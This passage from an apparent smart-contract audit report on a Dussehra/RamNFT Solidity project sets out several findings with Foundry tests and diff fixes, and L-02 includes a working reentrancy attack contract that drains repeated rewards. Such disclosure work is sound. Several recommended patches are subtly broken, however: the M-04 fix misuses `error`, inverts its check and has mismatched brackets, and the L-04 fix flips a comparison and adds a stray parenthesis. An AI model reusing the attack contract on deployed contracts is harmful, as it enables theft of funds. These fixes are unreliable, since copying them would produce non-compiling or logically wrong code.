        vm.stopPrank();

        // player2 is the owner
        assertEq(ramNFT.ownerOf(0), player2);
        // but getCharacteristics.ram still holds player1
        assertEq(ramNFT.getCharacteristics(0).ram, player1);
    }
```

## Impact
If `userA` calls `Dussehra::enterPeopleWhoLikeRam` and gets a Ram NFT with `tokenId = x`, but then sells/transfers this NFT to `userB`, then
- `userA` can still call `ChooseRam::increaseValuesOfParticipants` as if the NFT with `tokenId = x` was still his,
- if `tokenId = x` gets selected as Ram, `userA` will get 50% of the prize pool, not `userB`.

## Tools Used
Manual review, Foundry.

## Recommendations
Ensure that `CharacteristicsOfRam.ram` is modified on transfers by modifying `RamNFT` as follows:

```diff
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {ERC721URIStorage, ERC721} from "@openzeppelin/contracts/token/ERC721/extensions/ERC721URIStorage.sol";
+ import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";

contract RamNFT is ERC721URIStorage {
    error RamNFT__NotOrganiser();
    error RamNFT__NotChoosingRamContract();

    // https://medium.com/illumination/16-divine-qualities-of-lord-rama-24c326bd6048
    struct CharacteristicsOfRam {
        address ram;
        bool isJitaKrodhah;
        bool isDhyutimaan;
        bool isVidvaan;
        bool isAatmavan;
        bool isSatyavaakyah;
    }

    uint256 public tokenCounter;
    address public organiser;
    address public choosingRamContract;

    mapping(uint256 tokenId => CharacteristicsOfRam) public Characteristics;

    modifier onlyOrganiser() {
        if (msg.sender != organiser) {
            revert RamNFT__NotOrganiser();
        }
        _;
    }

    modifier onlyChoosingRamContract() {
        if (msg.sender != choosingRamContract) {
            revert RamNFT__NotChoosingRamContract();
        }
        _;
    }

    constructor() ERC721("RamNFT", "RAM") {
        tokenCounter = 0;
        organiser = msg.sender;
    }

+    function transferFrom(address from, address to, uint256 tokenId) public override(IERC721, ERC721) {
+        Characteristics[tokenId].ram = to;
+        super.transferFrom(from, to, tokenId);
+    }

    function setChoosingRamContract(address _choosingRamContract) public onlyOrganiser {
        choosingRamContract = _choosingRamContract;
    }
    
    function mintRamNFT(address to) public {
        uint256 newTokenId = tokenCounter++;
        _safeMint(to, newTokenId);

        Characteristics[newTokenId] = CharacteristicsOfRam({
            ram: to,
            isJitaKrodhah: false,
            isDhyutimaan: false,
            isVidvaan: false,
            isAatmavan: false,
            isSatyavaakyah: false
        });
    }

    function updateCharacteristics(
        uint256 tokenId,
        bool _isJitaKrodhah,
        bool _isDhyutimaan,
        bool _isVidvaan,
        bool _isAatmavan,
        bool _isSatyavaakyah
    ) public onlyChoosingRamContract {

        Characteristics[tokenId] = CharacteristicsOfRam({
            ram: Characteristics[tokenId].ram,
            isJitaKrodhah: _isJitaKrodhah,
            isDhyutimaan: _isDhyutimaan,
            isVidvaan: _isVidvaan,
            isAatmavan: _isAatmavan,
            isSatyavaakyah: _isSatyavaakyah
        });
    }

    function getCharacteristics(uint256 tokenId) public view returns (CharacteristicsOfRam memory) {
        return Characteristics[tokenId];
    }
    
    function getNextTokenId() public view returns (uint256) {
        return tokenCounter;
    }
}
```



## <a id='M-04'></a>M-04. Missing timegate for `Dussehra::enterPeopleWhoLikeRam`, users can join after Ram is selected/event ended            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2024-06-Dussehra/blob/9c86e1b09ed9516bfbb3851c145929806da75d87/src/Dussehra.sol#L52-L65

## Summary
`Dussehra::enterPeopleWhoLikeRam` is missing a time gate and, hence, can be (successfully) called even after the Dussehra event has ended.
Ideally, users are not supposed to be able to call `Dussehra::enterPeopleWhoLikeRam` after Ram has been selected.

## Vulnerability Details
`Dussehra::enterPeopleWhoLikeRam` is supposed to enable users to enter the Dussehra event by paying the neccessary entrance fee. In exchange, they get the following:
- a Ram NFT,
- a chance to increase the value of their NFT,
- a chance to become Ram for the event and as such, win 50% of the prize pool.

However, `Dussehra::enterPeopleWhoLikeRam` is not time-gated and, hence, users can call it even after the event.

This is demonstarted by the following test:

```javascript
    function test_playerCanEnterAfterEventEnded() public {
        vm.warp(1728777669 + 1);

        vm.deal(player1, 1 ether);

        // player enters after the event
        vm.prank(player1);
        dussehra.enterPeopleWhoLikeRam{value: 1 ether}();

        // player1 has the NFT
        assertEq(ramNFT.ownerOf(0), player1);
        assertEq(ramNFT.getCharacteristics(0).ram, player1);

        // player1 has 0 funds left, contract has the ether
        assertEq(player1.balance, 0);
        assertEq(address(dussehra).balance, 1 ether);
    }
```

## Impact
- Users who call this function after Ram has been selected but before 12th October 2024 will get only 2 from the 3 benefits players normally get. They will not get the chance to become Ram for the event.
- Users who call this function after 12th October 2024 will get only 1 from the 3 benefits players normally get. They will not get the chance to become Ram for the event, neither can they increase the value of their NFT.

## Tools Used
Manual review, Foundry.

## Recommendations
For fairness, ensure users cannot call `Dussehra::enterPeopleWhoLikeRam` after Ram has been selected. Modify `Dussehra` as follows:

```diff
    ...

+    error Dussehra__RamIsAlreadySelected();

    ...

    function enterPeopleWhoLikeRam() public payable {
+     if (choosingRamContract.isRamSelected() == false) {
+          error Dussehra__RamIsAlreadySelected();
+     )

        if (msg.value != entranceFee) {
            revert Dussehra__NotEqualToEntranceFee();
        }

        if (peopleLikeRam[msg.sender] == true){
            revert Dussehra__AlreadyPresent();
        }
        
        peopleLikeRam[msg.sender] = true;
        WantToBeLikeRam.push(msg.sender);
        ramNFT.mintRamNFT(msg.sender);
        emit PeopleWhoLikeRamIsEntered(msg.sender);
    }
```

# Low Risk Findings

## <a id='L-01'></a>L-01. ZkSync Era does not have native support for transferring Ether            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2024-06-Dussehra/blob/9c86e1b09ed9516bfbb3851c145929806da75d87/src/Dussehra.sol#L77C1-L78C1

https://github.com/Cyfrin/2024-06-Dussehra/blob/9c86e1b09ed9516bfbb3851c145929806da75d87/src/Dussehra.sol#L86

https://github.com/Cyfrin/2024-06-Dussehra/blob/9c86e1b09ed9516bfbb3851c145929806da75d87/src/Dussehra.sol#L53

## Summary

The protocol has multiple functions with low-level calls that are supposed to transfer Ether. However, ZkSync Era does not have native support for transferring Ether, so deployment to ZkSync requires additional considerations.

## Vulnerability Details

`Dussehra` utilizes low-level calls (indicated with "@> below) to directly transfer Ether in the following functions:

```javascript 
    function killRavana() public RamIsSelected {
        if (block.timestamp < 1728691069) {
            revert Dussehra__MahuratIsNotStart();
        }
        if (block.timestamp > 1728777669) {
            revert Dussehra__MahuratIsFinished();
        }
        IsRavanKilled = true;
        uint256 totalAmountByThePeople = WantToBeLikeRam.length * entranceFee;
        totalAmountGivenToRam = (totalAmountByThePeople * 50) / 100;
@>        (bool success, ) = organiser.call{value: totalAmountGivenToRam}("");
        require(success, "Failed to send money to organiser");
    }
```

```javascript
    function withdraw() public RamIsSelected OnlyRam RavanKilled {
        if (totalAmountGivenToRam == 0) {
            revert Dussehra__AlreadyClaimedAmount();
        }
        uint256 amount = totalAmountGivenToRam;
@>        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Failed to send money to Ram");
        totalAmountGivenToRam = 0;
    }
```

However, ZkSync does not have support for such direct Ether transfers, see the documentation at:
- https://docs.zksync.io/build/developer-reference/differences-with-ethereum.html#call-staticcall-delegatecall
- https://docs.zksync.io/zk-stack/components/smart-contracts/system-contracts.html#l2ethtoken-msgvaluesimulator
- https://docs.zksync.io/zk-stack/components/compiler/specification/system-contracts.html#ether-value-simulator

Instead, Ether transfers on ZkSync are handled by a special system contract called `MsgValueSimulator`.

Further details on how this work is available here: https://www.rollup.codes/zksync-era

"`CALL` Creates a new sub-context and executes the code of the given account. The `OPCODE` does not support sending ether natively If not compiled with zk-solc or zk-vyper, Ether must be sent using a system contract `MsgValueSimulator` prior to executing the `CALL` opcode. `zk-solc` and `zk-vyper` compilers inject the call to the system contract under the hood during compilation. ... "

## Impact
The impact depends on the compilation:

- if the contract is compiled with zk-solc or zk-vyper, there is no impact, as Ether transfer through `CALL` is handled automatically by the compiler, which injects calls to the `MsgValueSimulator` system contract.
- if the contract is not compiled with zk-solc or zk-vyper, `Dussehra::killRavana` and `Dussehra::withdraw` will not work on ZkSync, provided that the code is not adjusted.

## Tools Used
Manual review.

## Recommendations
- compile the contract using zk-solc for zkSync (so that you can use the `CALL` opcode directly without manually invoking the `MsgValueSimulator`, 

or

- to ensure compatibility across all environments, check the `chainID` and explicitly use the `MsgValueSimulator` for zkSync.
## <a id='L-02'></a>L-02. Possible reentrancy in `Dussehra::withdraw`            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2024-06-Dussehra/blob/9c86e1b09ed9516bfbb3851c145929806da75d87/src/Dussehra.sol#L81-L89

## Summary
`Dussehra::withdraw` can be reentered by a malicious contract if it has been selected as Ram.

## Vulnerability Details

`Dussehra::withdraw` does not follow the CEI (checks-effects-interactions) pattern. 
Consequently, a malicious Ram can reenter the function.

This is demonstrated by the following code:

<details>
<summary>Proof of Code</summary> 

```javascript
    function test_ReentrancyAttack() public {
        // setup attacker contract
        address attacker = makeAddr("attacker");
        vm.prank(attacker);
        ReentrancyAttack attackerContract = new ReentrancyAttack(address(dussehra), address(choosingRam));
        vm.deal(address(attackerContract), 1 ether);

        // set up users
        vm.deal(player1, 1 ether);
        vm.deal(player2, 1 ether);

        // users and attacker enter the event
        vm.prank(player1);
        dussehra.enterPeopleWhoLikeRam{value: 1 ether}();
        vm.prank(player2);
        dussehra.enterPeopleWhoLikeRam{value: 1 ether}();
        vm.prank(attacker);
        attackerContract.enterEvent();

        // attacker is selected as Ram
        vm.prank(organiser);
        vm.warp(1728691200 + 1);
        choosingRam.selectRamIfNotSelected();
        assertEq(choosingRam.selectedRam(), address(attackerContract));

        // Kill Ravan
        dussehra.killRavana();

        // suppose more funds entered the Dussehra contract after Ravan was killed
        // @note vm.deal sets the balance to the specified value, does not add the specified value to existing bal
        vm.deal(address(dussehra), address(dussehra).balance + 1.5 ether);

        // Trigger the reentrancy attack
        vm.prank(attacker);
        attackerContract.triggerAttack();
    }
```
</details>

<details>
<summary>Reentrant contract</summary> 

```javascript

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract ReentrancyAttack is IERC721Receiver {
    Dussehra public dussehra;
    ChoosingRam public choosingRam;

    address public owner;
    bool public attackTriggered;

    constructor(address _dussehra, address _choosingRam) {
        dussehra = Dussehra(_dussehra);
        choosingRam = ChoosingRam(_choosingRam);
        owner = msg.sender;
    }

    receive() external payable {
        if (!attackTriggered) {
            attackTriggered = true;
            dussehra.withdraw();
        }
    }

    function enterEvent() external {
        require(msg.sender == owner, "Only owner can challenge others");
        dussehra.enterPeopleWhoLikeRam{value: 1 ether}();
    }

    function challengeOthers(uint256 ownTokenId, uint256 otherTokenId) external {
        require(msg.sender == owner, "Only owner can initiate challenge");
        choosingRam.increaseValuesOfParticipants(ownTokenId, otherTokenId);
    }

    function triggerAttack() external {
        require(msg.sender == owner, "Only owner can trigger the attack");
        dussehra.withdraw();
    }

    // withdraw ETH from this contract
    function withdraw() external {
        require(msg.sender == owner, "Only owner can withdraw");
        payable(owner).transfer(address(this).balance);
    }

    /**
     * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
     * by `operator` from `from`, this function is called.
     *
     * It must return its Solidity selector to confirm the token transfer.
     * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
     */
    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        external
        override
        returns (bytes4)
    {
        //emit Received(operator, from, tokenId, data, gasleft());
        return this.onERC721Received.selector;
    }
}

```
</details>

## Impact

A malicious contract can witdraw the exact multiple(s) of the intended reward amount (`totalAmountByThePeople / 2`) from the `Dussehra` contract. 

However, there is but a slim possibility for this to happen, as
- the malicious contract needs to be selected as Ram for the event, and
- the `Dussehra` contract needs to have at least twice the indended reward amount on its ETH balance. This can only happen under special circumstances:

-- if users keep calling `Dussehra::enterPeopleWhoLikeRam` after Ravan has been killed (`Dussehra::KillRavana` successfully executed), and/or

-- users send ETH directly to `Dussehra`.

It is very unlikely that enough amount (`totalAmountByThePeople / 2`) will be collected this way.

However, if any meaningful amount `X` ends up in the contract this way but this `X` it is less than `totalAmountByThePeople / 2`, the attacker can send an amount of`totalAmountByThePeople / 2 - X` ETH to `Dussehra` to extract an extra profit of `X`.

## Tools Used
Manual review, Foundry.

## Recommendations
To prevent possible reentrancy attacks, perform the following modifications in `Dussehra`:

```diff
    function withdraw() public RamIsSelected OnlyRam RavanKilled {
        if (totalAmountGivenToRam == 0) {
            revert Dussehra__AlreadyClaimedAmount();
        }
        uint256 amount = totalAmountGivenToRam;
+      totalAmountGivenToRam = 0;
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Failed to send money to Ram");
-      totalAmountGivenToRam = 0;
    }
```
## <a id='L-03'></a>L-03. Missing check of `tokenId` existance in `RamNFT::getCharacteristics`            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2024-06-Dussehra/blob/9c86e1b09ed9516bfbb3851c145929806da75d87/src/RamNFT.sol#L82C1-L84C6

## Summary

`RamNFT::getCharacteristics` expects the `tokenId` of an NFT as an input parameter.
However, the function does not check whether the specified `tokenId` actually exists. Instead, for non-existent `tokenId`s, it will return a `CharacteristicsOfRam` struct with the following default values:

`CharacteristicsOfRam.ram = 0x0000000000000000000000000000000000000000
isJitaKrodhah = false
isDhyutimaan = false
isVidvaan = false
isAatmavan = false
isSatyavaakyah = false`

## Impact
The function returns without an error, potetially leading to confusion.

## Tools Used
Manual review.

## Recommendations



```diff
    function getCharacteristics(uint256 tokenId) public view returns (CharacteristicsOfRam memory) {
+      require(_ownerOf(tokenId) != address(0), "TokenID does not exist.");
        return Characteristics[tokenId];
    }
```

## <a id='L-04'></a>L-04. Incorrect timegates in `Dussehra::killRavana`            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2024-06-Dussehra/blob/9c86e1b09ed9516bfbb3851c145929806da75d87/src/Dussehra.sol#L68

https://github.com/Cyfrin/2024-06-Dussehra/blob/9c86e1b09ed9516bfbb3851c145929806da75d87/src/Dussehra.sol#L71

## Summary

`Dussehra::killRavana` is time gated, but the timegates are incorrect. 

## Vulnerability Details

According to the readme, `Dussehra::killRavana` is supposed to work only after 12th October 2024 and before 13th October 2024. This time-gating is supposed to be enforced by the following lines:

```javascript
   function killRavana() public RamIsSelected {
@>        if (block.timestamp < 1728691069) {
            revert Dussehra__MahuratIsNotStart();
        }
@>        if (block.timestamp > 1728777669) {
            revert Dussehra__MahuratIsFinished();
        }
        IsRavanKilled = true;
        uint256 totalAmountByThePeople = WantToBeLikeRam.length * entranceFee;
        totalAmountGivenToRam = (totalAmountByThePeople * 50) / 100;
        (bool success, ) = organiser.call{value: totalAmountGivenToRam}("");
        require(success, "Failed to send money to organiser");
    }
```

However, `block.timestamp = 1728691069` corresponds not to the desired date but to Fri Oct 11 2024 23:57:49 GMT+0000.
Similarly, `block.timestamp = 1728777669` corresponds not to the desired date but to Sun Oct 13 2024 00:01:09 GMT+0000.

## Impact
`Dussehra::killRavana` can be called in a wider time window than originally intended.

## Tools Used
Manual review.

## Recommendations
Correct `Dussehra::killRavana` as follows:

```diff
    function killRavana() public RamIsSelected {
-       if (block.timestamp < 1728691069) {
+      if (block.timestamp < 1728691200)) {
            revert Dussehra__MahuratIsNotStart();
        }
-       if (block.timestamp > 1728777669) {
+      if (block.timestamp < 1728777600) {
            revert Dussehra__MahuratIsFinished();
        }
        IsRavanKilled = true;
        uint256 totalAmountByThePeople = WantToBeLikeRam.length * entranceFee;
        totalAmountGivenToRam = (totalAmountByThePeople * 50) / 100;
        (bool success, ) = organiser.call{value: totalAmountGivenToRam}("");
        require(success, "Failed to send money to organiser");
    }
```


